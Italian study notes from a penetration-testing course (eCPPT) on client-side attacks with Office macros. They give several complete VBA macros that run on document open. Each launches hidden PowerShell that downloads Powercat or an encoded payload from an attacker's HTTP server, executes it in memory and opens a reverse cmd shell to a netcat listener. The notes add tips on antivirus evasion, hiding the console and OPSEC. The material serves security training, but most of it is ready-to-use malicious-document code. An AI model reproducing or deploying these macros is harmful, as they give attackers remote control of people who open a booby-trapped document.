# 016 — VBA Reverse Shell Macro with Powercat (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 16/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [016_VBA Reverse Shell Macro with Powercat.txt](016_VBA Reverse Shell Macro with Powercat.txt) · [016_VBA Reverse Shell Macro with Powercat.srt](016_VBA Reverse Shell Macro with Powercat.srt)

## Concetti chiave

- **Powercat** = porting PowerShell di Netcat (autore Besimorhino). Singolo file `powercat.ps1`, è una **funzione** PowerShell da loaddare prima dell'uso.
- Reverse shell senza Metasploit: handler = **`nc -nvlp 1337`**, niente Meterpreter.
- Tecnica: VBA macro → PowerShell → `IEX (New-Object Net.WebClient).DownloadString('http://attacker/powercat.ps1')` → `powercat -c <ip> -p <port> -e cmd`.
- **Eseguzione in-memory** (`IEX` su `DownloadString`) → nulla viene scritto sul disco (vs dropper del video 015) → bypass migliore di signature-based AV.
- Powercat supporta payload generation con **encoding base64** per ulteriore offuscamento.
- `WindowStyle Hidden` + `vbHide` per nascondere la finestra PowerShell.

## Spiegazione approfondita

### Setup Powercat su Kali
```bash
cd ~/Desktop
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080
```
Files: `LICENSE`, `README.md`, `powercat.ps1`.

### Macro VBA — Powercat reverse shell (in-memory)
```vba
Sub Document_Open()
    PowerCatShell
End Sub
Sub AutoOpen()
    PowerCatShell
End Sub

Sub PowerCatShell()
    Dim url As String
    url = "http://192.168.2.134:8080/powercat.ps1"

    Dim PS As String
    PS = "IEX (New-Object System.Net.WebClient).DownloadString('" & url & "');" & _
         "powercat -c 192.168.2.134 -p 1337 -e cmd"

    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & PS & """", vbHide
End Sub
```
- `IEX` (Invoke-Expression) esegue lo script scaricato **direttamente in memoria**.
- `powercat -c <ip> -p <port> -e cmd` = client mode, connect-back, esegue `cmd.exe` e lo binda al socket.

### Listener
```bash
nc -nvlp 1337
```
Quando la vittima apre il doc + Enable Content → reverse shell `C:\Users\...>` immediata.

### Variante 2 — Encoded Reverse Shell (più stealth)
Powercat può **pre-generare** il payload encoded, eliminando la necessità di scaricare l'intero `powercat.ps1` runtime.

Su Kali:
```bash
# Avvia pwsh (PowerShell Core su Linux)
pwsh
$LHOST = "192.168.2.134"; $LPORT = 1337
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -l -p $LPORT -e cmd -ge > /tmp/reverse_shell.txt
# -ge = generate encoded payload
```
Output: `/tmp/reverse_shell.txt` con base64 enorme (= `powershell -e <base64>`).

Hosting:
```bash
cd /tmp && python3 -m http.server 8080
```

Macro che scarica e decodifica/esegue:
```vba
Sub Document_Open()
    Dim s As String
    s = "powershell -e $(New-Object Net.WebClient).DownloadString('http://192.168.2.134:8080/reverse_shell.txt')"
    CreateObject("WScript.Shell").Run s, 0, False
End Sub
```
Nel video, Alexis costruisce una versione più articolata usando `IEX`+`powershell -e <codeVar>`. Il punto è: payload **encoded** in transito, decoded e **eseguito in memoria**.

### Vantaggi vs dropper exe (video 015)
| Aspetto | Dropper EXE | Powercat in-memory |
|---|---|---|
| File su disco | Sì (.exe) | No (solo `.ps1` scaricato in RAM) |
| Detection AV | Alta (hash exe) | Bassa (PS in memory) |
| Dipendenza | nessuna | PowerShell + outbound HTTP |
| Handler | `multi/handler` | `nc` semplice |
| Footprint forense | exe + log filesystem | solo network + PS history |

### OPSEC tips dal video
- Mai usare il proprio IP reale: VPS / redirector / C2 dedicato.
- Sempre `WindowStyle Hidden` + `vbHide` → l'utente non vede flash di console.
- Powercat supporta anche `-dns` (tunnel DNS) → utile in reti con egress filtering.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `git clone https://github.com/besimorhino/powercat.git` | Ottieni Powercat |
| `python3 -m http.server 8080` | Hosting `.ps1` |
| `IEX (New-Object Net.WebClient).DownloadString('<url>')` | Carica funzione in memoria |
| `powercat -c <ip> -p <port> -e cmd` | Reverse shell client |
| `powercat -l -p <port> -e cmd -ge` | Generate encoded payload |
| `nc -nvlp <port>` | Listener |
| `powershell -EncodedCommand <b64>` | Esegue PS base64 |
| `Shell "powershell ... ", vbHide` | Exec hidden da VBA |

## Esempi pratici

```vba
' Forma più compatta usata da Alexis nella variante 2
Sub Document_Open()
    Dim code As String
    code = "$c=(New-Object Net.WebClient).DownloadString('http://192.168.2.134:8080/reverse_shell.txt');" & _
           "IEX $c"
    CreateObject("WScript.Shell").Run _
        "powershell -nop -w hidden -ep bypass -c """ & code & """", 0, False
End Sub
```

```bash
# Listener nc
nc -nvlp 1337
# Vittima apre doc → shell:
# Microsoft Windows [Version 10.0.19045.xxx]
# C:\Users\admin>whoami
```

## Punti d'attenzione per l'esame eCPPT

- **Powercat** = porting PowerShell di **Netcat** → reverse shell senza Metasploit.
- Pattern d'oro: **`IEX (New-Object Net.WebClient).DownloadString('http://<atk>/powercat.ps1')`** → carica in memoria.
- Reverse shell call: **`powercat -c <ip> -p <port> -e cmd`**.
- Handler = **`nc -nvlp <port>`**, no `multi/handler`.
- Encoded payload con flag **`-ge`** (generate encoded) di Powercat.
- Esecuzione **in-memory** = vantaggio chiave su dropper a disco.
- Switch chiave PowerShell: **`-ExecutionPolicy Bypass`**, **`-WindowStyle Hidden`**, **`-NoProfile`**, **`-EncodedCommand <b64>`**.
- VBA `Shell` con `vbHide` (=0) per evitare flash console alla vittima.

## Collegamenti con altri video

- Precedente: [[015_VBA PowerShell Dropper]]
- Prossimo: [[017_Using ActiveX Controls for Macro Execution]]
- Trigger alternativo: [[017_Using ActiveX Controls for Macro Execution]] (no `Document_Open`).
- Approfondimento PowerShell: modulo **PowerShell for Pentesters** (obfuscation, Empire).
- HTA come dropper alternativo: [[019_HTML Applications (HTA)]] · [[020_HTA Attacks]].
